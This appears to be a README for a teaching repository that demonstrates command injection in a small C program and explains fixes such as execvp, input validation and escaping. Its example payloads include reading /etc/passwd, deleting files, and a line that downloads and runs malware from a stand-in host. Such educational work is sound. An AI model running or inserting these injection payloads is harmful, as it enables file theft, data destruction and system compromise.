# Command Injection Vulnerability

## **Building and Running**

> [!IMPORTANT]
> 
> This should be run in project's root directory!
> 

```bash 
make build-all 
make run_system
```

## Overview

This repository demonstrates a command injection vulnerability, a severe security flaw that occurs when an application passes unsanitized user input to a system shell for execution. The demonstration consists of a single C program that takes user input and uses it to construct a shell command.

## The Vulnerability Explained

### How It Works

The vulnerable program:
1. Prompts the user for input with `scanf("%[^\n]s", user_input)`
2. Uses `sprintf()` to construct a shell command: `sprintf(command, "echo %s", user_input)`
3. Executes this command using `system(command)`

The vulnerability lies in two critical design flaws:

1. **Improper Input Handling**: User input is taken directly from stdin and used in command construction without sanitization
2. **Dangerous System Call**: The program uses the `system()` function to execute shell commands with user-controlled content

### The Attack Vector

The `system()` function passes its argument to the shell for interpretation and execution. When user input is incorporated into this command without proper filtering, attackers can inject additional shell commands using shell metacharacters like `;`, `|`, `&`, `&&`, or `||`.

For example, if a user enters:
```
hello; ls -la
```

The constructed command becomes:
```
echo hello; ls -la
```

This executes two separate commands:
1. `echo hello`
2. `ls -la`

More dangerous examples include:
```
hello; cat /etc/passwd
hello; rm -rf /important_files
hello && wget http://malicious.site/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware
```

## Why This Is Dangerous

This vulnerability demonstrates several critical security issues:

1. **Arbitrary Command Execution**: Attackers can execute any command with the privileges of the program.

2. **Privilege Escalation**: If the program runs with elevated privileges (e.g., setuid root), attackers can execute commands with those same privileges.

3. **Data Theft**: Attackers can access sensitive files and exfiltrate data.

4. **System Compromise**: This vulnerability can lead to full system compromise through installation of backdoors or other malware.

5. **Service Disruption**: Attackers can crash services or delete critical files.

## Real-World Implications

In real-world applications, command injection vulnerabilities have led to:

- Database breaches and data theft
- Web server compromises
- Cloud infrastructure attacks
- IoT device exploitation
- Critical infrastructure sabotage

Many high-profile security incidents have stemmed from command injection flaws, making it #3 in the OWASP Top 10 Web Application Security Risks.

## How To Fix The Vulnerability

There are several approaches to mitigate command injection vulnerabilities:

### 1. Avoid Shell Commands When Possible

The safest approach is to avoid using shell commands entirely:

```c
// Instead of system("echo hello"), use printf directly
printf("hello\n");

// Instead of system("rm file.txt"), use unlink
unlink("file.txt");
```

### 2. Use Safer Alternatives to system()

If you must execute external commands, use alternatives to `system()`:

```c
// Using execve() family of functions instead of system()
char *args[] = {"echo", user_input, NULL};
execvp("echo", args);
```

The `execve()` family doesn't invoke a shell, making command injection impossible.

### 3. Input Validation and Sanitization

Implement strict input validation:

```c
// Check for shell metacharacters and reject input containing them
bool is_safe_input(const char *input) {
    const char *dangerous_chars = ";&|`()${}[]!#~<>?*";
    return (strpbrk(input, dangerous_chars) == NULL);
}

if (!is_safe_input(user_input)) {
    printf("Invalid input detected. Aborting.\n");
    exit(1);
}
```

### 4. Use String Escaping

If you must use `system()`, escape user input properly:

```c
// Example of a simple escaping function (not comprehensive)
void escape_string(char *dst, const char *src, size_t dst_size) {
    size_t i, j = 0;
    for (i = 0; src[i] != '\0' && j < dst_size - 1; i++) {
        if (strchr(";&|`()${}[]!#~<>?*", src[i]) != NULL) {
            if (j < dst_size - 2) {
                dst[j++] = '\\';
                dst[j++] = src[i];
            } else {
                break;
            }
        } else {
            dst[j++] = src[i];
        }
    }
    dst[j] = '\0';
}

// Usage
char escaped_input[200];
escape_string(escaped_input, user_input, sizeof(escaped_input));
snprintf(command, sizeof(command), "echo %s", escaped_input);
```

### 5. Use Command-Line Argument Arrays

When using safer functions like `execve()`, pass arguments as an array instead of concatenating strings:

```c
char *args[] = {"echo", user_input, NULL};
pid_t pid = fork();
if (pid == 0) {
    // Child process
    execvp(args[0], args);
    exit(1); // Only reached if execvp fails
} else if (pid > 0) {
    // Parent process
    int status;
    waitpid(pid, &status, 0);
}
```

## Broader Secure Coding Practices

1. **Defense in Depth**: Implement multiple layers of protection.
2. **Principle of Least Privilege**: Run applications with minimal required permissions.
3. **Input Validation**: Always validate all user input before processing.
4. **Use Safe APIs**: Choose libraries and functions designed with security in mind.
5. **Code Review**: Regularly audit code for security vulnerabilities.

## Demonstration Setup

To demonstrate this vulnerability:

1. Compile the program:
```bash
gcc -o vulnerable_cmd vulnerable_cmd.c
```

2. Run the program and try these exploit examples:
```bash
./vulnerable_cmd
Enter your message: hello; ls -la
```

3. Observe how the program executes both the `echo hello` command and the injected `ls -la` command.

## Conclusion

Command injection vulnerabilities represent one of the most serious security flaws in software that interfaces with system shells. These vulnerabilities can lead to complete system compromise and data breaches.

The key to prevention is to avoid passing user input to shell interpreters whenever possible, and when unavoidable, to implement strict input validation, proper escaping, and to use safer alternatives to functions like `system()`.
